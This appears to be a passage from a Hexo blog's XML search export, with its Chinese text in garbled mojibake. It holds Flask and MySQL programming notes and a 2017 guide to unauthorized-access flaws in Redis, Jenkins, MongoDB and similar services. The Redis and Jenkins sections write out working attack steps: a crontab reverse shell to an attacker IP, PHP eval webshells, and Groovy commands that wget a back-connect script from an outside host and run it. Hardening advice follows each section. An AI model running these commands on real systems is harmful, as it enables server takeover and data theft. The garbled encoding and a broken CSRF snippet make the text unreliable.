columnname_joinwhere m.columnname=xxxâ€¦.. and n.columnname=xxxâ€¦.æˆ–è€…select m.columnnameâ€¦â€¦,n.* columnnameâ€¦..from left_table m , right_table nwhere m. columnname_join=n. columnname_join andm.columnname=xxxâ€¦.. and n.columnname=xxxâ€¦. ONæ˜¯è¿æ¥æ¡ä»¶ï¼Œä¸å†ä¸å·¦è¿æ¥æˆ–å³è¿æ¥çš„åŠŸæ•ˆä¸€æ ·ï¼Œé™¤äº†ä½œä¸º2è¡¨è®°å½•åŒ¹é…çš„æ¡ä»¶å¤–ï¼Œè¿˜ä¼šèµ·åˆ°è¿‡æ»¤è®°å½•çš„ä½œç”¨ï¼Œè‹¥left_tableä¸­è®°å½•æ— æ³•åœ¨right_tableä¸­æ‰¾åˆ°å¯¹åº”çš„è®°å½•ï¼Œåˆ™ä¼šè¢«è¿‡æ»¤æ‰ï¼› WHEREå­—å¥ï¼Œä¸ç®¡æ˜¯æ¶‰åŠè¡¨left_tableã€è¡¨right_tableä¸Šçš„é™åˆ¶æ¡ä»¶ï¼Œè¿˜æ˜¯æ¶‰åŠ2è¡¨è¿æ¥çš„æ¡ä»¶ï¼Œéƒ½ä¼šå¯¹è®°å½•é›†èµ·åˆ°è¿‡æ»¤ä½œç”¨ï¼ŒæŠŠä¸ç¬¦åˆè¦æ±‚çš„è®°å½•åˆ·é€‰æ‰ï¼› jinja2è·å–å¾ªç¯ç´¢å¼•1234567jinja2è·å–å¾ªç¯&#123;% for i in n %&#125;çš„ç´¢å¼•ä½¿ç”¨loop.index&#123;% for i in names %&#125;&lt;tr&gt; &lt;td&gt;&#123;&#123; loop.index &#125;&#125;&lt;/td&gt; //å½“å‰æ˜¯ç¬¬xæ¡ &lt;td&gt;&#123;&#123; i.name &#125;&#125;&lt;/td&gt;&lt;/tr&gt;&#123;% endfor %&#125; flask é‡å®šå‘å’Œé”™è¯¯å¯ä»¥ç”¨redirect()å‡½æ•°æŠŠç”¨æˆ·é‡å®šå‘åˆ°å…¶å®ƒåœ°æ–¹ã€‚æ”¾å¼ƒè¯·æ±‚å¹¶è¿”å›é”™è¯¯ä»£ç ï¼Œç”¨abort()å‡½æ•°ã€‚ 12345678from flask import abort, redirect, url_for@app.route(&apos;/&apos;)def index(): return redirect(url_for(&apos;login&apos;))@app.route(&apos;/login&apos;)def login(): abort(401) this_is_never_executed() é»˜è®¤æƒ…å†µä¸‹ï¼Œé”™è¯¯ä»£ç ä¼šæ˜¾ç¤ºä¸€ä¸ªé»‘ç™½çš„é”™è¯¯é¡µé¢ã€‚å¦‚æœä½ è¦å®šåˆ¶é”™è¯¯é¡µé¢ï¼Œå¯ä»¥ä½¿ç”¨errorhandler() è£…é¥°å™¨: 1234from flask import render_template@app.errorhandler(404)def page_not_found(error): return render_template(&apos;page_not_found.html&apos;), 404 æ³¨æ„ render_template()è°ƒç”¨ä¹‹åçš„ 404 ã€‚è¿™å‘Šè¯‰Flaskï¼Œè¯¥é¡µçš„é”™è¯¯ä»£ç æ˜¯404 ï¼Œå³æ²¡æœ‰æ‰¾åˆ°ã€‚é»˜è®¤ä¸º200ï¼Œä¹Ÿå°±æ˜¯ä¸€åˆ‡æ­£å¸¸ã€‚ flask CSRFé˜²æŠ¤æœºåˆ¶123456789101112@app.before_requestdef csrf_protect(): if request.method == &quot;POST&quot;: token = session.pop(&apos;_csrf_token&apos;, None) if not token or token != request.form.get(&apos;_csrf_token&apos;): abort(403)def some_random_string(): return hashlib.sha256(os.urandom(16).hexdigest())def generate_csrf_token(): if &apos;_csrf_token&apos; not in session: session[&apos;_csrf_token&apos;] = some_random_string() return session[&apos;_csrf_token&apos;] åœ¨flaskçš„å…¨å±€å˜é‡é‡Œé¢æ³¨å†Š ä¸Šé¢é‚£ä¸ªç”Ÿæˆéšæœºtokençš„å‡½æ•° app.jinja_env.globals[&#39;csrf_token&#39;] = generate_csrf_token åœ¨ç½‘é¡µçš„æ¨¡æ¿æ˜¯è¿™ä¹ˆå¼•å…¥çš„ 12&lt;form method=post action=&quot;&quot;&gt; &lt;input name=_csrf_token type=hidden value=&quot;&#123;&#123; csrf_token() &#125;&#125;&quot;&gt; flaskä¸Šä¸‹æ–‡å¤„ç†å™¨Flask ä¸Šä¸‹æ–‡å¤„ç†å™¨è‡ªåŠ¨å‘æ¨¡æ¿çš„ä¸Šä¸‹æ–‡ä¸­æ’å…¥æ–°å˜é‡ã€‚ä¸Šä¸‹æ–‡å¤„ç†å™¨åœ¨æ¨¡æ¿æ¸²æŸ“ä¹‹å‰è¿è¡Œï¼Œå¹¶ä¸”å¯ä»¥åœ¨æ¨¡æ¿ä¸Šä¸‹æ–‡ä¸­æ’å…¥æ–°å€¼ã€‚ä¸Šä¸‹æ–‡å¤„ç†å™¨æ˜¯ä¸€ä¸ªè¿”å›å­—å…¸çš„å‡½æ•°ï¼Œè¿™ä¸ªå­—å…¸çš„é”®å€¼æœ€ç»ˆå°†ä¼ å…¥åº”ç”¨ä¸­æ‰€æœ‰æ¨¡æ¿çš„ä¸Šä¸‹æ–‡: 123@app.context_processordef inject_user(): return dict(user=g.user) ä¸Šé¢çš„ä¸Šä¸‹æ–‡å¤„ç†å™¨ä½¿å¾—æ¨¡æ¿å¯ä»¥ä½¿ç”¨ä¸€ä¸ªåä¸ºuserå€¼ä¸ºg.userçš„å˜é‡ã€‚ä¸è¿‡è¿™ä¸ªä¾‹å­ä¸æ˜¯å¾ˆæœ‰æ„æ€ï¼Œå› ä¸ºgåœ¨æ¨¡æ¿ä¸­æœ¬æ¥å°±æ˜¯å¯ç”¨çš„ï¼Œä½†å®ƒè§£é‡Šäº†ä¸Šä¸‹æ–‡å¤„ç†å™¨æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚å˜é‡ä¸ä»…é™äºå€¼ï¼Œä¸Šä¸‹æ–‡å¤„ç†å™¨ä¹Ÿå¯ä»¥ä½¿æŸä¸ªå‡½æ•°åœ¨æ¨¡æ¿ä¸­å¯ç”¨ï¼ˆç”±äºPythonå…è®¸ä¼ é€’å‡½æ•°ï¼‰: 1234567@app.context_processordef utility_processor(): def format_price(amount, currency=u&apos;â‚¬&apos;): return u&apos;&#123;0:.2f&#125;&#123;1&#125;.format(amount, currency) return dict(format_price=format_price)ä¸Šé¢çš„ä¸Šä¸‹æ–‡å¤„ç†å™¨ä½¿å¾—format_priceå‡½æ•°åœ¨æ‰€æœ‰æ¨¡æ¿ä¸­å¯ç”¨:&#123;&#123; format_price(0.33) &#125;&#125; æ—¥å¿—è®°å½•handler = logging.FileHandler(&#39;flask.log&#39;, encoding=&#39;UTF-8&#39;) 1ã€è¯·æ±‚ä¹‹å‰è®¾ç½®requestIdå¹¶è®°å½•æ—¥å¿—æ¯ä¸ªURLè¯·æ±‚ä¹‹å‰ï¼Œå®šä¹‰requestIdå¹¶ç»‘å®šåˆ°g 1234@app.before_requestdef before_request(): g.requestId = gen_requestId() logger.info(&quot;Start Once Access, and this requestId is %s&quot; % g.requestId) 2ã€è¯·æ±‚ä¹‹åæ·»åŠ å“åº”å¤´ä¸è®°å½•æ—¥å¿—æ¯æ¬¡è¿”å›æ•°æ®ä¸­ï¼Œå¸¦ä¸Šå“åº”å¤´ï¼ŒåŒ…å«APIç‰ˆæœ¬å’Œæœ¬æ¬¡è¯·æ±‚çš„requestIdï¼Œä»¥åŠå…è®¸æ‰€æœ‰åŸŸè·¨åŸŸè®¿é—®API, è®°å½•è®¿é—®æ—¥å¿— 123456789101112131415161718@app.after_requestdef add_header(response): response.headers[&quot;X-SaintIC-Media-Type&quot;] = &quot;saintic.v1&quot; response.headers[&quot;X-SaintIC-Request-Id&quot;] = g.requestId response.headers[&quot;Access-Control-Allow-Origin&quot;] = &quot;*&quot; logger.info(json.dumps(&#123; &quot;AccessLog&quot;: &#123; &quot;status_code&quot;: response.status_code, &quot;method&quot;: request.method, &quot;ip&quot;: request.headers.get(&apos;X-Real-Ip&apos;, request.remote_addr), &quot;url&quot;: request.url, &quot;referer&quot;: request.headers.get(&apos;Referer&apos;), &quot;agent&quot;: request.headers.get(&quot;User-Agent&quot;), &quot;requestId&quot;: str(g.requestId), &#125; &#125; )) return response basicConfigæ–¹æ³•å¯ä»¥æ»¡è¶³ä½ åœ¨ç»å¤§å¤šæ•°åœºæ™¯ä¸‹çš„ä½¿ç”¨éœ€æ±‚ï¼Œä½†æ˜¯basicConfigæœ‰ä¸€ä¸ªå¾ˆå¤§çš„ç¼ºç‚¹ã€‚è°ƒç”¨basicConfigå…¶å®æ˜¯ç»™root loggeræ·»åŠ äº†ä¸€ä¸ªhandler(FileHandler )ï¼Œè¿™æ ·å½“ä½ çš„ç¨‹åºå’Œåˆ«çš„ä½¿ç”¨äº† loggingçš„ç¬¬ä¸‰æ–¹æ¨¡å—ä¸€èµ·å·¥ä½œæ—¶ï¼Œä¼šå½±å“ç¬¬ä¸‰æ–¹æ¨¡å—çš„loggerè¡Œä¸ºã€‚è¿™æ˜¯ç”±loggerçš„ç»§æ‰¿ç‰¹æ€§å†³å®šçš„ 1234567logging.basicConfig(level=logging.DEBUG, format=&apos;%(asctime)s %(levelname)s %(message)s&apos;, datefmt=&apos;%a, %d %b %Y %H:%M:%S&apos;, filename=&apos;logs/pro.log&apos;, filemode=&apos;w&apos;)logging.debug(&apos;dddddddddd&apos;) MySQLå­—ç¬¦ç¼–ç é™¤äº†è®¾ç½®æ•°æ®åº“çš„ä¹‹å¤–ï¼Œç”±äºdataseté»˜è®¤åˆ›å»ºæ•°æ®åº“å’Œè¡¨çš„å­—ç¬¦é›†ä¸æ˜¯utf8,æ‰€ä»¥éœ€è¦è‡ªå·±è®¾ç½®ï¼Œå¦åˆ™ä¼šä¸­æ–‡ä¹±ç ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹è¡¨çš„å­—ç¬¦é›† 1234567my.cnf[client]default-character-set=utf8[mysqld]character-set-server=utf8collation-server=utf8_general_cidefault-storage-engine=INNODB è¡¨çš„å­—ç¬¦é›† show create table tasks; alter table tasks convert to character set utf8;]]></content>
      <tags>
        <tag>ç¼–ç¨‹</tag>
        <tag>Python</tag>
        <tag>MySQL</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æœªæˆæƒè®¿é—®æ¼æ´æ€»ç»“]]></title>
    <url>%2F2017%2F09%2F28%2F%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[å‰è¨€ä»Šå¹´5æœˆï¼Œæ¯”ç‰¹å¸å‹’ç´¢ç—…æ¯’WannaCryå¸­å·å…¨çƒï¼Œå›½å†…ä¼—å¤šæœºæ„éƒ¨é—¨è®¡ç®—æœºç³»ç»Ÿç˜«ç—ªã€‚æ ¹æ®ä¹‹å‰åº”æ€¥å“åº”çš„æ¡ˆä¾‹åˆ†æï¼Œä»¥åŠä¸€äº›å®‰å…¨æŠ¥å‘Šç»Ÿè®¡ï¼Œç›®å‰å¤§éƒ¨åˆ†çš„å‹’ç´¢ç—…æ¯’å‡åˆ©ç”¨æœªæˆæƒè®¿é—®ç­‰é€šç”¨æ¼æ´è¿›è¡Œæ¤å…¥ã€å‹’ç´¢ï¼Œå°¤å…¶æ˜¯Redisã€MongoDBç­‰æ•°æ®åº“çš„æœªæˆæƒè®¿é—®æ¼æ´å°¤å…¶ä¸¥é‡ã€‚ 0x01 ä»‹ç»æœªæˆæƒè®¿é—®å¯ä»¥ç†è§£ä¸ºéœ€è¦å®‰å…¨é…ç½®æˆ–æƒé™è®¤è¯çš„åœ°å€ã€æˆæƒé¡µé¢å­˜åœ¨ç¼ºé™·ï¼Œå¯¼è‡´å…¶ä»–ç”¨æˆ·å¯ä»¥ç›´æ¥è®¿é—®ï¼Œä»è€Œå¼•å‘é‡è¦æƒé™å¯è¢«æ“ä½œã€æ•°æ®åº“ã€ç½‘ç«™ç›®å½•ç­‰æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚ ç›®å‰ä¸»è¦å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´çš„æœ‰ï¼šNFSæœåŠ¡ï¼ŒSambaæœåŠ¡ï¼ŒLDAPï¼ŒRsyncï¼ŒFTPï¼ŒGitLabï¼ŒJenkinsï¼ŒMongoDBï¼ŒRedisï¼ŒZooKeeperï¼ŒElasticSearchï¼ŒMemcacheï¼ŒCouchDBï¼ŒDockerï¼ŒSolrï¼ŒHadoopï¼ŒDubboç­‰ï¼Œæœ¬æ–‡ä¸»è¦ä»‹ç»ä¸€äº›ç›®å‰æ¯”è¾ƒå¸¸ç”¨çš„ä¸€äº›æœåŠ¡çš„æœªæˆæƒè®¿é—®ï¼Œæ¬¢è¿å¤§å®¶è¡¥å……ï¼ 0x02 Redisæœªæˆæƒè®¿é—®2.1 æ¼æ´æè¿°Rediså› é…ç½®ä¸å½“å¯ä»¥æœªæˆæƒè®¿é—®ã€‚æ”»å‡»è€…æ— éœ€è®¤è¯è®¿é—®åˆ°å†…éƒ¨æ•°æ®ï¼Œå¯å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œä¹Ÿå¯ä»¥æ¶æ„æ‰§è¡Œflushallæ¥æ¸…ç©ºæ‰€æœ‰æ•°æ®ã€‚å¦‚æœRedisä»¥rootèº«ä»½è¿è¡Œï¼Œå¯ä»¥ç»™rootè´¦æˆ·å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡SSHç™»å½•å—å®³æœåŠ¡å™¨ã€‚ 2.2 æ¼æ´åˆ©ç”¨1ã€åˆ©ç”¨è®¡åˆ’ä»»åŠ¡æ‰§è¡Œå‘½ä»¤åå¼¹shellåœ¨redisä»¥rootæƒé™è¿è¡Œæ—¶å¯ä»¥å†™crontabæ¥æ‰§è¡Œå‘½ä»¤åå¼¹shell å…ˆåœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šç›‘å¬ä¸€ä¸ªç«¯å£ nc -lvnp 4444 ç„¶åæ‰§è¡Œå‘½ä»¤:12345redis-cli -h 192.168.2.6set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.1/4444 0&gt;&amp;1\n&quot;config set dir /var/spool/cron/config set dbfilename rootsave 2ã€å†™ssh-keygenå…¬é’¥ç™»å½•æœåŠ¡å™¨åœ¨ä»¥ä¸‹æ¡ä»¶ä¸‹ï¼Œå¯ä»¥åˆ©ç”¨æ­¤æ–¹æ³• 1ã€RedisæœåŠ¡ä½¿ç”¨rootè´¦å·å¯åŠ¨2ã€æœåŠ¡å™¨å¼€æ”¾äº†SSHæœåŠ¡ï¼Œè€Œä¸”å…è®¸ä½¿ç”¨å¯†é’¥ç™»å½•ï¼Œå³å¯è¿œç¨‹å†™å…¥ä¸€ä¸ªå…¬é’¥ï¼Œç›´æ¥ç™»å½•è¿œç¨‹æœåŠ¡å™¨ã€‚ æ­¤æ–¹æ³•å…·ä½“å‚è€ƒï¼šredisé…ç½®ä¸å½“å¯ç›´æ¥å¯¼è‡´æœåŠ¡å™¨è¢«æ§åˆ¶3ã€è·å–webæœåŠ¡çš„webshellå½“redisæƒé™ä¸é«˜æ—¶ï¼Œå¹¶ä¸”æœåŠ¡å™¨å¼€ç€webæœåŠ¡ï¼Œåœ¨redisæœ‰webç›®å½•å†™æƒé™æ—¶ï¼Œå¯ä»¥å°è¯•å¾€webè·¯å¾„å†™webshellã€‚ æ‰§è¡Œä»¥ä¸‹å‘½ä»¤1234config set dir /var/www/html/config set dbfilename shell.phpset x &quot;&lt;?php @eval($_POST[&apos;caidao&apos;]);?&gt;&quot;save å³å¯å°†shellå†™å…¥webç›®å½• 2.3 æ¼æ´åŠ å›ºå¯ä»¥é…ç½®redis.confè¿™ä¸ªæ–‡ä»¶ï¼Œåœ¨å®‰è£…ç›®å½•ä¸‹ é»˜è®¤åªå¯¹æœ¬åœ°å¼€æ”¾ bind 127.0.0.1 æ·»åŠ ç™»é™†å¯†ç  requirepass www.secpulse.com åœ¨éœ€è¦å¯¹å¤–å¼€æ”¾çš„æ—¶å€™ä¿®æ”¹é»˜è®¤ç«¯å£ port 2333 æœ€åè¿˜å¯ä»¥é…åˆiptablesé™åˆ¶å¼€æ”¾ 0x03 Jenkinsæœªæˆæƒè®¿é—®3.1 æ¼æ´æè¿°é»˜è®¤æƒ…å†µä¸‹Jenkinsé¢æ¿ä¸­ç”¨æˆ·å¯ä»¥é€‰æ‹©æ‰§è¡Œè„šæœ¬ç•Œé¢æ¥æ“ä½œä¸€äº›ç³»ç»Ÿå±‚å‘½ä»¤ï¼Œæ”»å‡»è€…å¯é€šè¿‡æœªæˆæƒè®¿é—®æ¼æ´æˆ–è€…æš´åŠ›ç ´è§£ç”¨æˆ·å¯†ç ç­‰è¿›è„šæœ¬æ‰§è¡Œç•Œé¢ä»è€Œè·å–æœåŠ¡å™¨æƒé™ã€‚ 3.2 æ¼æ´åˆ©ç”¨1ã€Jenkinsæœªæˆæƒè®¿é—®å¯æ‰§è¡Œå‘½ä»¤http://www.secpulse.com:8080/managehttp://www.secpulse.com:8080/scriptprintln â€œifconfig -aâ€.execute().text æ‰§è¡Œä¸€äº›ç³»ç»Ÿå‘½ä»¤ç›´æ¥wgetä¸‹è½½back.pyåå¼¹shell123println &quot;wget http://xxx.secpulse.com/tools/back.py -P /tmp/&quot;.execute().textprintln &quot;python /tmp/back.py 10.1.1.111 8080&quot;.execute().textback.pyå¹¶ä¸éœ€è¦rootæƒé™ ä¸æƒ³åå¼¹è¯•è¯•Terminal Plugin2ã€Jenkinsæœªæˆæƒè®¿é—®å†™shelljenskinsæ˜¯java webé¡¹ç›®,æˆ‘ä»¬ç”¨javaçš„Fileç±»å†™æ–‡ä»¶12345new File(&quot;c://temp//secpulse.txt&quot;).write(&quot;&quot;&quot;123&quot;&quot;&quot;); æ–°å»ºä¸€ä¸ªå†…å®¹ä¸º1,2,3(æ¯ä¸€è¡Œ)çš„1.txtåˆ°cç›˜çš„tempæ–‡ä»¶å¤¹,è¿è¡Œå¦‚ä¸‹å‘½ä»¤println â€œpowershell dir c:\tempâ€.execute().textå¦‚æœå†™æˆåŠŸ,é‚£ä¹ˆsecpulse.txtå°±ä¼šåœ¨è¿”å›ç»“æœä¸­!wgetå†™webshell12345678910111. println &quot;wget http://shell.secpulse.com/data/t.txt -o /var/www/html/secpulse.php&quot;.execute().text2. new File(&quot;/var/www/html/secpulse.php&quot;).write(&apos;&lt;?php @eval($_POST[s3cpu1se]);?&gt;&apos;);3. def webshell = &apos;&lt;?php @eval($_POST[s3cpu1se]);?&gt;&apos;new File(&quot;/var/www/html/secpulse.php&quot;).write(&quot;$webshell&quot;);4. def execute(cmd) &#123;def proc = cmd.execute()proc.waitFor()&#125;execute( [ &apos;bash&apos;, &apos;-c&apos;, &apos;echo -n &quot;&lt;?php @eval($&quot; &gt; /usr/local/nginx_1119/html/secpulse.php&apos; ] )execute( [ &apos;bash&apos;, &apos;-c&apos;, &apos;echo &quot;_POST[s3cpu1se]);?&gt;&quot; &gt;&gt; /usr/local/nginx_1119/html/secpulse.php&apos; ] )//å‚æ•°-n ä¸è¦åœ¨æœ€åè‡ªåŠ¨æ¢è¡Œ Result: 0 è¡¨ç¤ºæˆåŠŸå†™å…¥ Result: 1 è¡¨ç¤ºç›®å½•ä¸å­˜åœ¨æˆ–è€…æƒé™ä¸è¶³ å†™å…¥å¤±è´¥ Result: 2 è¡¨ç¤ºæ„é€ æœ‰å¼‚å¸¸ å†™å…¥å¤±è´¥ å…·ä½“å…¶ä»–è¯¦ç»†åˆ©ç”¨æ–¹æ³•å‚è€ƒï¼šçŸ¥å…¶ä¸€ä¸çŸ¥å…¶äºŒä¹‹Jenkins Hacking 3.3 æ¼æ´åŠ å›º ç¦æ­¢æŠŠJenkinsç›´æ¥æš´éœ²åœ¨å…¬ç½‘ æ·»åŠ è®¤è¯ï¼Œå»ºè®®ä½¿ç”¨ç”¨æˆ·çŸ©é˜µæˆ–è€…ä¸JIRAæ‰“é€šï¼ŒJIRAè®¾ç½®å¯†ç å¤æ‚åº¦ 0x04 MongoDBæœªæˆæƒè®¿é—®4.1 æ¼æ´æè¿°å¼€å¯MongoDBæœåŠ¡æ—¶ä¸æ·»åŠ ä»»ä½•å‚æ•°æ—¶,é»˜è®¤æ˜¯æ²¡æœ‰æƒé™éªŒè¯çš„,è€Œä¸”å¯ä»¥è¿œç¨‹è®¿é—®æ•°æ®åº“ï¼Œç™»å½•çš„ç”¨æˆ·å¯ä»¥é€šè¿‡é»˜è®¤ç«¯å£æ— éœ€å¯†ç å¯¹æ•°æ®åº“è¿›è¡Œå¢ã€åˆ ã€æ”¹ã€æŸ¥ç­‰ä»»æ„é«˜å±æ“ä½œã€‚ 4.2 æ¼æ´åˆ©ç”¨ 4.3 æ¼æ´åŠ å›º ä¸ºMongoDBæ·»åŠ è®¤è¯ï¼š 123451)MongoDBå¯åŠ¨æ—¶æ·»åŠ --authå‚æ•°2)ç»™MongoDBæ·»åŠ ç”¨æˆ·ï¼šuse admin #ä½¿ç”¨adminåº“db.addUser(&quot;root&quot;, &quot;123456&quot;) #æ·»åŠ ç”¨æˆ·årootå¯†ç 123456çš„ç”¨æˆ·db.auth(&quot;root&quot;,&quot;123456&quot;) #éªŒè¯ä¸‹æ˜¯å¦æ·»åŠ æˆåŠŸï¼Œè¿”å›1è¯´æ˜æˆåŠŸ ç¦ç”¨HTTPå’ŒRESTç«¯å£ 1MongoDBè‡ªèº«å¸¦æœ‰ä¸€ä¸ªHTTPæœåŠ¡å’Œå¹¶æ”¯æŒRESTæ¥å£ã€‚åœ¨2.6ä»¥åè¿™äº›æ¥å£é»˜è®¤æ˜¯å…³é—­çš„ã€‚mongoDBé»˜è®¤ä¼šä½¿ç”¨é»˜è®¤ç«¯å£ç›‘å¬webæœåŠ¡ï¼Œä¸€èˆ¬ä¸éœ€è¦é€šè¿‡webæ–¹å¼è¿›è¡Œè¿œç¨‹ç®¡ç†ï¼Œå»ºè®®ç¦ç”¨ã€‚ä¿®æ”¹é…ç½®æ–‡ä»¶æˆ–åœ¨å¯åŠ¨çš„æ—¶å€™é€‰æ‹©â€“nohttpinterface å‚æ•°nohttpinterface=false é™åˆ¶ç»‘å®šIP 1234å¯åŠ¨æ—¶åŠ å…¥å‚æ•°--bind_ip 127.0.0.1æˆ–åœ¨/etc/mongodb.confæ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼šbind_ip = 127.0.0.1 0x05 ZooKeeperæœªæˆæƒè®¿é—®5.1 æ¼æ´æè¿°Zookeeperçš„é»˜è®¤å¼€æ”¾ç«¯å£æ˜¯2181ã€‚Zookeeperå®‰è£…éƒ¨ç½²ä¹‹åé»˜è®¤æƒ…å†µä¸‹ä¸éœ€è¦ä»»ä½•èº«ä»½éªŒè¯ï¼Œé€ æˆæ”»å‡»è€…å¯ä»¥è¿œç¨‹åˆ©ç”¨Zookeeperï¼Œé€šè¿‡æœåŠ¡å™¨æ”¶é›†æ•æ„Ÿä¿¡æ¯æˆ–è€…åœ¨Zookeeperé›†ç¾¤å†…è¿›è¡Œç ´åï¼ˆæ¯”å¦‚ï¼škillå‘½ä»¤ï¼‰ã€‚æ”»å‡»è€…èƒ½å¤Ÿæ‰§è¡Œæ‰€æœ‰åªå…è®¸ç”±ç®¡ç†å‘˜è¿è¡Œçš„å‘½ä»¤ã€‚ 5.2 æ¼æ´åˆ©ç”¨æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯è¿œç¨‹è·å–è¯¥æœåŠ¡å™¨çš„ç¯å¢ƒï¼š echo envi | nc ip port ç›´æ¥è¿æ¥ï¼š ./zkCli.sh -server ip:port 5.3 æ¼æ´åŠ å›º ç¦æ­¢æŠŠZookeeperç›´æ¥æš´éœ²åœ¨å…¬ç½‘ æ·»åŠ è®¿é—®æ§åˆ¶ï¼Œæ ¹æ®æƒ…å†µé€‰æ‹©å¯¹åº”æ–¹å¼ï¼ˆè®¤è¯ç”¨æˆ·ï¼Œç”¨æˆ·åå¯†ç ï¼‰ ç»‘å®šæŒ‡å®šIPè®¿é—® 0x06 Elasticsearchæœªæˆæƒè®¿é—®6.1 æ¼æ´æè¿°Elasticsearchæ˜¯ä¸€æ¬¾javaç¼–å†™çš„ä¼ä¸šçº§æœç´¢æœåŠ¡ã€‚è¶Šæ¥è¶Šå¤šçš„å…¬å¸ä½¿ç”¨ELKä½œä¸ºæ—¥å¿—åˆ†æï¼Œå¯åŠ¨æ­¤æœåŠ¡é»˜è®¤ä¼šå¼€æ”¾9200ç«¯å£ï¼Œå¯è¢«éæ³•æ“ä½œæ•°æ® 6.2 æ¼æ´åˆ©ç”¨æ¼æ´æ£€æµ‹ï¼šé»˜è®¤ç«¯å£9200 ç›¸å½“äºä¸€ä¸ªAPIï¼Œä»»ä½•äººè®¿é—®è¿™ä¸ªåœ°å€ï¼Œå°±å¯ä»¥è°ƒç”¨apiï¼Œè¿›è¡Œæ•°æ®çš„å¢åˆ æ”¹æ“ä½œã€‚ http://x.x.x.x:9200/_nodes http://x.x.x.x:9200/_river 6.3 æ¼æ´åŠ å›º é˜²ç«å¢™ä¸Šè®¾ç½®ç¦æ­¢å¤–ç½‘è®¿é—®æ­¤ç«¯å£ã€‚ ä½¿ç”¨Nginxæ­å»ºåå‘ä»£ç†ï¼Œé€šè¿‡é…ç½®Nginxå®ç°å¯¹Elasticsearchçš„è®¤è¯ åœ¨config/elasticsearch.ymlä¸­ä¸º9200ç«¯å£è®¾ç½®è®¤è¯ï¼š 1234http.basic.enabled true #å¼€å…³ï¼Œå¼€å¯ä¼šæ¥ç®¡å…¨éƒ¨HTTPè¿æ¥http.basic.user &quot;admin&quot; #è´¦å·http.basic.password &quot;admin_pw&quot; #å¯†ç http.basic.ipwhitelist [&quot;localhost&quot;, &quot;127.0.0.1&quot;] 0x07 Memcacheæœªæˆæƒè®¿é—®7.1 æ¼æ´æè¿°Memcachedæ˜¯ä¸€å¥—å¸¸ç”¨çš„key-valueç¼“å­˜ç³»ç»Ÿï¼Œç”±äºå®ƒæœ¬èº«æ²¡æœ‰æƒé™æ§åˆ¶æ¨¡å—ï¼Œæ‰€ä»¥å¯¹å…¬ç½‘å¼€æ”¾çš„MemcacheæœåŠ¡å¾ˆå®¹æ˜“è¢«æ”»å‡»è€…æ‰«æå‘ç°ï¼Œæ”»å‡»è€…é€šè¿‡å‘½ä»¤äº¤äº’å¯ç›´æ¥è¯»å–Memcachedä¸­çš„æ•æ„Ÿä¿¡æ¯ã€‚ 7.2 æ¼æ´åˆ©ç”¨1ã€ç™»å½•æœºå™¨æ‰§è¡Œnetstat -an |moreå‘½ä»¤æŸ¥çœ‹ç«¯å£ç›‘å¬æƒ…å†µã€‚å›æ˜¾0.0.0.0:11211è¡¨ç¤ºåœ¨æ‰€æœ‰ç½‘å¡è¿›è¡Œç›‘å¬ï¼Œå­˜åœ¨memcachedæœªæˆæƒè®¿é—®æ¼æ´ã€‚ 2ã€telnet 11211ï¼Œæˆ–nc -vv 11211ï¼Œæç¤ºè¿æ¥æˆåŠŸè¡¨ç¤ºæ¼æ´å­˜åœ¨ 7.3 æ¼æ´åŠ å›º è®¾ç½®memchachedåªå…è®¸æœ¬åœ°è®¿é—® ç¦æ­¢å¤–ç½‘è®¿é—®Memcached 11211ç«¯å£ ç¼–è¯‘æ—¶åŠ ä¸Šâ€“enable-saslï¼Œå¯ç”¨SASLè®¤è¯ 0x08 Hadoopæœªæˆæƒè®¿é—®8.1 æ¼æ´æè¿°ç”±äºæœåŠ¡å™¨ç›´æ¥åœ¨å¼€æ”¾äº†Hadoopæœºå™¨HDFSçš„50070 webç«¯å£åŠéƒ¨åˆ†é»˜è®¤æœåŠ¡ç«¯å£ï¼Œé»‘å®¢å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œæ“ä½œå¤šä¸ªç›®å½•ä¸‹çš„æ•°æ®ï¼Œå¦‚è¿›è¡Œåˆ é™¤ï¼Œä¸‹è½½ï¼Œç›®å½•æµè§ˆç”šè‡³å‘½ä»¤æ‰§è¡Œç­‰æ“ä½œï¼Œäº§ç”Ÿæå¤§çš„å±å®³ã€‚ 8.2 æ¼æ´åˆ©ç”¨ä¸»è¦HDFSå’ŒMapReduceçš„WebUIå¯¹åº”çš„æœåŠ¡ç«¯å£ã€‚å…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯DataNode é»˜è®¤ç«¯å£50075å¼€æ”¾çš„è¯ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡hdsfæä¾›çš„restful apiå¯¹hdfså­˜å‚¨æ•°æ®è¿›è¡Œæ“ä½œã€‚ restful apiå‚è€ƒï¼šhttp://hadoop.apache.org/docs/r1.0.4/webhdfs.html 8.3 æ¼æ´åŠ å›º å¦‚æ— å¿…è¦ï¼Œå…³é—­Hadoop Webç®¡ç†é¡µé¢ å¼€å¯èº«ä»½éªŒè¯ï¼Œé˜²æ­¢æœªç»æˆæƒç”¨æˆ·è®¿é—® è®¾ç½®â€œå®‰å…¨ç»„â€è®¿é—®æ§åˆ¶ç­–ç•¥ï¼Œå°†Hadoopé»˜è®¤å¼€æ”¾çš„å¤šä¸ªç«¯å£å¯¹å…¬ç½‘å…¨éƒ¨ç¦æ­¢æˆ–é™åˆ¶å¯ä¿¡ä»»çš„IPåœ°å€æ‰èƒ½è®¿é—®åŒ…æ‹¬50070ä»¥åŠWebUIç­‰ç›¸å…³ç«¯å£ï¼Œè¯¦ç»†ç«¯å£åˆ—è¡¨å¦‚ä¸‹ï¼š 123456789101112131415a)HDFSNameNode é»˜è®¤ç«¯å£ 50070DataNode 